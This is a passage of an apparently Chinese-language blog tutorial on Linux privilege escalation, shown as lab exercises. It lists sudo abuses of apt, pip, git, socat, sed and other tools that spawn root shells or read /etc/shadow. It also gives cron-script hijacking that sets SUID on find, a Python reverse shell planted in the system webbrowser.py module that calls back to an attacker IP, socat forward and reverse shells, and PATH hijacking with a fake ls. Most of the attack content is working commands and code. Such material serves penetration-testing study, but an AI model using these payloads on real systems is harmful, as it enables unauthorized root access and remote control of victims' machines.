+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">zip</span> <span class="token number">1</span>.zip raj.txt <span class="token parameter variable">-T</span> --unzip-command<span class="token operator">=</span><span class="token string">"sh -c ifconfig"</span></pre></td></tr></table></figure><h4 id="-apt"><a class="anchor" href="#-apt">#</a> - apt</h4>
+<p>apt 命令是一个强大的命令行工具，它与 Ubuntu 的高级打包工具 （APT） 配合使用，执行安装新软件包、升级现有软件包、更新包列表索引，甚至升级整个 Ubuntu 系统等功能。</p>
+<p><strong>方法一：</strong></p>
+<p>要通过 apt 服务直接利用 sudo，我们只需运行以下命令，该命令将以 root 权限为我们调用 bash</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#用来在更新 apt 软件包时在更新之前执行一个 bash 脚本的命令</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token parameter variable">-o</span> APT::Update::Pre-Invoke::<span class="token operator">=</span> /bin/bash</pre></td></tr></table></figure><p><strong>方法二：</strong></p>
+<p>我们可以使用 apt-get 查看软件包的变更记录。使用以下命令可以查看 apt 包的变更日志：</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> changelog <span class="token function">apt</span></pre></td></tr></table></figure><p>这会打开一个类似 man 页面的控制台编辑器</p>
+<p><img data-src="9.png" alt="img"></p>
+<p>在这里，我们可以输入 &quot;!/bin/sh&quot; 并按回车来执行 bash shell。   如果看到提示符变为 &quot;#&quot;，说明我们已经成功获取了 root shell 权限</p>
+<p><img data-src="11.png" alt="img"></p>
+<p><strong>方法三</strong></p>
+<p>我们可以使用 dpkg 来构造一个包，而不是使用 apt-get 来调用 bin/bash。我们首先构建一个临时文件，在其中构建一个调用 /bin/bash 的打包，然后通过 apt-get 安装该包。</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'Dpkg::Pre-Invoke &#123;"/bin/sh;false"&#125;'</span> <span class="token operator">></span> <span class="token variable">$TF</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-c</span> <span class="token variable">$TF</span> sl</pre></td></tr></table></figure><h4 id="-time"><a class="anchor" href="#-time">#</a> - time</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">time</span> <span class="token function">cat</span> /etc/shadow</pre></td></tr></table></figure><h4 id="-xxd"><a class="anchor" href="#-xxd">#</a> - xxd</h4>
+<p>xxd 命令使用户能够生成给定文件的十六进制转储，还可以将十六进制转储反转回其原始 ASCII 格式</p>
+<p>利用</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>xxd <span class="token string">"/etc/shadow"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span></pre></td></tr></table></figure><h4 id="-socat"><a class="anchor" href="#-socat">#</a> - socat</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> socat TCP4-LISTEN:1234, reuseaddr EXEC:<span class="token string">"/bin/sh"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#在攻击机执行</span></pre></td></tr><tr><td data-num="3"></td><td><pre>socat – TCP4:192.168.1.100:1234</pre></td></tr></table></figure><p><img data-src="12.png" alt="img"></p>
+<p>还有一种方法：</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> socat exec:<span class="token string">'sh –li'</span> ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#在攻击机执行：</span></pre></td></tr><tr><td data-num="3"></td><td><pre>socat file: <span class="token string">'tty'</span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:1234</pre></td></tr></table></figure><p>一种正向连接，一种反向连接</p>
+<h4 id="-tmux"><a class="anchor" href="#-tmux">#</a> - tmux</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> tmux</pre></td></tr></table></figure><h4 id="-sed"><a class="anchor" href="#-sed">#</a> - sed</h4>
+<p>sed 用于搜索、查找和替换、插入或删除等</p>
+<pre><code>sudo sed -n 'le exec sh 1&gt;&amp;0' /etc/passwd
+</code></pre>
+<p><img data-src="image-20250110175540371.png" alt="image-20250110175540371"></p>
+<h4 id="-ed"><a class="anchor" href="#-ed">#</a> - ed</h4>
+<p><strong>ed</strong> 命令用于启动 “<em>ed</em> <strong>text editor”</strong>，这是一个基于行的文本编辑器。</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ed </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">!</span>/bin/sh</pre></td></tr></table></figure><p><img data-src="image-20250110180035372.png" alt="image-20250110180035372"></p>
+<h4 id="-pip"><a class="anchor" href="#-pip">#</a> - pip</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp <span class="token parameter variable">-d</span><span class="token variable">)</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> ><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> 2><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span>')"</span> <span class="token operator">></span> <span class="token variable">$TF</span>/setup.py</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> pip <span class="token function">install</span> <span class="token variable">$TF</span></pre></td></tr></table></figure><h4 id="-git"><a class="anchor" href="#-git">#</a> - git</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config</pre></td></tr></table></figure><p>这将调用默认的分页器来读取类似于 man 的配置，我们在这里可以注入 “!/bin/sh”，然后按回车键来为我们执行 bash shell。</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">!</span>/bin/bash</pre></td></tr></table></figure><p><img data-src="10.png" alt="img"></p>
+<p><img data-src="11-1736503639422-11.png" alt="img"></p>
+<h4 id="-taskset"><a class="anchor" href="#-taskset">#</a> - taskset</h4>
+<p>Taskset 用于设置或检索正在运行的进程的 CPU 亲和力，给定其 PID，或者以给定的 CPU 亲和力启动一个新的命令。</p>
+<p>利用：</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> taskset <span class="token number">1</span> /bin/sh –p</pre></td></tr></table></figure><h2 id="4-计划任务提权"><a class="anchor" href="#4-计划任务提权">#</a> 4. 计划任务提权</h2>
+<h3 id="1etccrontab"><a class="anchor" href="#1etccrontab">#</a> 1. <code>/etc/crontab</code></h3>
+<p>Linux 中的计划任务是指预定在特定时间或周期性地自动执行的任务。</p>
+<p><strong>文件格式</strong></p>
+<p><code>/etc/crontab</code>  文件中每一行代表一项计划任务，以空格或制表符分隔，格式如下：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span>    <span class="token operator">*</span>    <span class="token operator">*</span>    <span class="token operator">*</span>    <span class="token operator">*</span>    用户名    命令</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span>    <span class="token operator">-</span>    <span class="token operator">-</span>    <span class="token operator">-</span>    <span class="token operator">-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> 星期几 <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">0</span> 或 <span class="token number">7</span> 表示星期日<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> 月份 <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>    <span class="token operator">|</span>    <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> 日期 <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>    <span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> 小时 <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> 分钟 <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">59</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>时间字段的特殊符号</strong></p>
+<ul>
+<li><strong>星号（ <code>\*</code> ）</strong>：表示所有合法的值。例如，如果在小时字段使用 <code>*</code> ，表示每小时都运行任务。</li>
+<li><strong>逗号（ <code>,</code> ）</strong>：表示多个值。例如，如果在分钟字段使用 <code>0,30</code> ，表示在每小时的第 0 和第 30 分钟运行任务。</li>
+<li><strong>连字符（ <code>-</code> ）</strong>：表示一个范围。例如，如果在小时字段使用 <code>1-5</code> ，表示在凌晨 1 点到 5 点之间每小时运行任务。</li>
+<li><strong>斜杠（ <code>/</code> ）</strong>：表示步长。例如，如果在分钟字段使用 <code>*/15</code> ，表示每 15 分钟运行一次任务。</li>
+</ul>
+<p><strong>典型范例：</strong></p>
+<p>每天凌晨 2:30 以 root 身份运行 <code>/usr/bin/backup</code>  脚本：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">30</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>backup</pre></td></tr></table></figure><p>每小时的第 0 和第 30 分钟以 root 身份运行 <code>/usr/bin/cleanup</code>  脚本：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>cleanup</pre></td></tr></table></figure><p>每月的 1 号和 15 号凌晨 3 点以 root 身份运行 <code>/usr/bin/update</code>  脚本：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0</span> <span class="token number">3</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token operator">*</span> root <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>update</pre></td></tr></table></figure><p>每周一至周五的每天下午 5 点以 user 身份运行 <code>/usr/bin/dailyreport</code>  脚本：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0</span> <span class="token number">17</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span> user <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>dailyreport</pre></td></tr></table></figure><p>每隔 5 分钟以 root 身份运行 <code>/usr/bin/check_status</code>  脚本：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span><span class="token operator">/</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>check_status</pre></td></tr></table></figure><p>查看计划任务</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cat</span> /etc/crontab</pre></td></tr></table></figure><h3 id="2操作-3"><a class="anchor" href="#2操作-3">#</a> 2. 操作</h3>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查看计划任务</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /etc/crontab</pre></td></tr></table></figure><p><img data-src="image-20250114112742208.png" alt="image-20250114112742208"></p>
+<p>可以看到，每两分钟会以 root 权限执行 <code>python3 /home/clean/cleanup.py</code></p>
+<p>我们看一下 cleanup 的内容</p>
+<p><img data-src="image-20250114112804947.png" alt="image-20250114112804947"></p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -r /home/clean/cleanthings/* '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>程序的意思为调用系统命令 <code>rm -r /home/clean/cleanthings/*</code>  ，即删除 <code>/home/clean/cleanthings/</code>  目录下的文件。</p>
+<p>所以这个定时任务为每隔两分钟删除特定目录下的所有文件。</p>
+<p>我们看一下这个 py 程序的权限</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/clean/cleanup.py</pre></td></tr></table></figure><p><img data-src="image-20250114112817336.png" alt="image-20250114112817336"></p>
+<p>发现我们有权限对其进行编辑，我们修改它的内容</p>
+<pre><code>vim /home/clean/cleanup.py
+</code></pre>
+<p>将其修改并保存。</p>
+<figure class="highlight py"><figcaption data-lang="Python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'chmod u+s /usr/bin/find'</span><span class="token punctuation">)</span> <span class="token comment">#chmod u+s /usr/bin/find</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>等待程序运行</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> <span class="token string">"whoami"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="image-20250114112838055.png" alt="image-20250114112838055"></p>
+<p>提权成功！</p>
+<h2 id="5-python库劫持提权"><a class="anchor" href="#5-python库劫持提权">#</a> 5. python 库劫持提权</h2>
+<p>原理：python 程序引入的库可写</p>
+<p>这个漏洞是基于应用于我们脚本导入的模块文件的权限。当导入的模块文件具有允许任何用户编辑的权限时，就会成为一个漏洞。</p>
+<p>在我们创建的 Python 脚本中，我们调用了 <span class="exturl" data-url="aHR0cDovL3dlYmJyb3dzZXIucHk=">webbrowser.py</span> 模块文件。在未经修改的默认环境中，这通常不会出现问题，但在开发环境中，出于便利性的考虑可能会牺牲一些安全性。</p>
+<p>登录到 clean 用户，查看 sudo -l</p>
+<pre><code>sudo -l
+</code></pre>
+<p><img data-src="image-20240716234742616.png" alt="image-20240716234742616"></p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1yb290cHl0aG9ud2ViLXZtM3VhNGkxNzJocXBhbjEzdHRvYmg2NWNocDZkbmNoaG04anZoN2MucHk=">发现我们可以以 root 权限用 python 执行 web.py</span></p>
+<p>我们看一下 /home/pyraj/web.py 的权限和内容</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查看权限</span></pre></td></tr><tr><td data-num="2"></td><td><pre>la <span class="token parameter variable">-l</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#看内容</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">cat</span> /home/pyraj/web.py</pre></td></tr></table></figure><p><img data-src="image-20240716234948598.png" alt="image-20240716234948598"></p>
+<p><img data-src="image-20240716235004413.png" alt="image-20240716235004413"></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#文件内容</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">import</span> webbrowser</pre></td></tr><tr><td data-num="3"></td><td><pre>webbrowser.open<span class="token punctuation">(</span><span class="token string">"http://example.com"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#引入 webbrowser 模块，用浏览器打开网站</span></pre></td></tr></table></figure><p>该文件我们不能够编辑。</p>
+<p>我们看一下引入的模块：webbrowser</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查看位置</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">locate</span> webbrowser.py</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#查看权限</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">ls</span> <span class="token parameter variable">-l</span> /usr/lib/python3.8/webbrowser.py</pre></td></tr></table></figure><p><img data-src="image-20240716235458717.png" alt="image-20240716235458717"></p>
+<p>权限还是比较高的，可以编辑</p>
+<p>我们可以对其进行劫持</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /usr/lib/python3.8/webbrowser.py</pre></td></tr></table></figure><p>插入恶意代码</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#准备插入的恶意代码</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> subprocess</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> os <span class="token keyword">as</span> original_os</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.87.136"</span><span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#192.168.87.136 为 kali 的 ip，4444 为监听端口</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    original_os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    original_os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    original_os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>reverse_shell<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="image-20240716235743248.png" alt="image-20240716235743248"></p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1zdWRvd2ViLW9jNms1MjF6ZTl2Ynhqci5weQ==">使用 sudo 运行 web.py</span>，同时 kali 监听端口</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#kali</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span></pre></td></tr></table></figure><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#使用 sudo，利用 root 权限来运行 web.py</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> /usr/bin/python3.8 /home/pyraj/web.py</pre></td></tr></table></figure><p><img data-src="image-20240717000056507.png" alt="image-20240717000056507"></p>
+<p>提权成功。</p>
+<h2 id="6-path变量劫持"><a class="anchor" href="#6-path变量劫持">#</a> 6. PATH 变量劫持</h2>
+<p>PATH 变量是 Linux 系统中的一个<strong>环境变量</strong>，它告诉系统在哪些目录中查找可执行文件。当您在终端输入一个命令时，系统会按照 PATH 中列出的目录<strong>顺序</strong>查找该命令的可执行文件。</p>
+<h3 id="path变量的特点"><a class="anchor" href="#path变量的特点">#</a> PATH 变量的特点</h3>
+<ol>
+<li>
+<p><strong>每个用户都有自己的 PATH 环境变量</strong></p>
+</li>
+<li>
+<p>普通用户可以修改自己的 PATH 变量</p>
+</li>
+<li>
+<p>这种修改只影响当前用户的当前会话（或者该用户的所有会话，如果将命令添加到～/.bashrc 中）</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 临时修改（仅影响当前终端会话）  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 永久修改（需要添加到用户的配置文件中）  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=.:$PATH'</span> <span class="token operator">>></span> ~/.bashrc</pre></td></tr></table></figure></li>
+</ol>
+<blockquote>
+<p>“每个用户都有自己的 PATH 环境”，正说明了 PATH 提权在一些计划任务（比如 root 执行某个计划任务）中是无法利用的，因为 root 权限运行的程序通常有自己的安全 PATH 设置，不会继承普通用户的 PATH，我们进行 <code>export path</code>  的操作是针对当前终端的普通用户，而不是 root；而且 /etc/crontab 中通常定义了安全的 PATH</p>
+</blockquote>
+<h3 id="path变量的权限提升原理"><a class="anchor" href="#path变量的权限提升原理">#</a> PATH 变量的权限提升原理</h3>
+<ol>
+<li>当普通用户执行某个需要 root 权限的程序时（SUID）</li>
+<li>如果该程序在执行过程中调用了其他命令，但<strong>没有使用完整路径</strong></li>
+<li>攻击者可以通过修改 PATH 变量，让系统<strong>优先</strong>在攻击者指定的目录中查找这些命令</li>
+<li>攻击者可以放置一个<strong>同名的恶意程序</strong>，从而获取提升的权限</li>
+</ol>
+<h3 id="示例"><a class="anchor" href="#示例">#</a> 示例</h3>
+<p>假设有一个场景：</p>
+<ol>
+<li>有一个具有 SUID 权限的程序  <code>vulnerable_program</code></li>
+<li>这个程序在运行时会调用  <code>ls</code>  命令，但使用的是  <code>system(&quot;ls&quot;)</code>  而不是  <code>system(&quot;/bin/ls&quot;)</code></li>
+<li>攻击者可以这样利用：</li>
+</ol>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 1. 创建一个恶意的 ls 程序  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'#!/bin/bash'</span> <span class="token operator">></span> /tmp/ls  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'bash'</span> <span class="token operator">>></span> /tmp/ls  </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">chmod</span> +x /tmp/ls  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 2. 修改 PATH 变量，让 /tmp 目录优先  </span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 3. 运行有漏洞的程序  </span></pre></td></tr><tr><td data-num="8"></td><td><pre>./vulnerable_program</pre></td></tr></table></figure><blockquote>
+<p>当运行./&lt;command&gt; 时，系统会优先顺次检查 PATH 环境变量下的目录，如果没有找到该可执行文件，则执行当前目录（相对路径）下的 &lt; command&gt;，如果还是没找到，则报错</p>
+<ul>
+<li>
+<p><strong>验证当前使用的是哪个命令</strong>（以 cat 举例）</p>
